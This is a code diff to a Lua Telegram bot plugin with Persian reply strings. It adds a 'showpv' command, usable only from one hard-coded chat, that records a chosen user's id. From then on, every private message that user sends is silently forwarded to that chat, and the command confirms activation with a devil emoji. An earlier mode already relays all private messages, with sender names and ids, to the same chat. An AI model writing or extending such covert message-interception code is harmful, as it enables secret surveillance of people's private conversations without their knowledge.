@@ -31,6 +31,14 @@ local function run(msg, matches)
             else
               send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
             end
+    elseif matches[1] == "showpv" or matches[1] == "Showpv" and matches[2] ~= 'nil'then
+          if msg.to.id == 142334685 then
+              redis:set("id", matches[2])
+              show = 4
+              return "فعال 😈"
+            else
+              send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
+            end
     elseif matches[1] == "ansmod" or matches[1] == "Ansmod" then
           if is_sudo(msg) then
             if tonumber(ansmod) == 0 then
@@ -40,7 +48,7 @@ local function run(msg, matches)
                   ansmod = 1
                   return "on"
                 else
-                  return "Error"
+                  return "Error "..show
                 end
               else
                 send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
@@ -57,6 +65,12 @@ local function run(msg, matches)
     elseif tonumber(show) == 3 then
       if msg.to.type == "user" then
         send_msg('chat#142334685', msg.from.print_name..'\n'..msg.from.id..'\n___________\n'..msg.text, ok_cb, false)
+      end
+    elseif tonumber(show) == 4 then
+      if msg.to.type == "user" then
+        if msg.from.id == tonumber(redis:get("id")) then
+          send_msg('chat#142334685', msg.text, ok_cb, false)
+        end
       end
     end
     if msg.to.id == 142334685 then
@@ -79,6 +93,7 @@ return {
         "^([Ss]how)$",
         "^([Ss]howpv)$",
         "^([Ss]how) (%d+)$",
+        "^([Ss]howpv) (%d+)$",
         "^([Ss]top)$",
         "^([Aa]nsmod)$",
         "^([Aa]nsmod off)$",
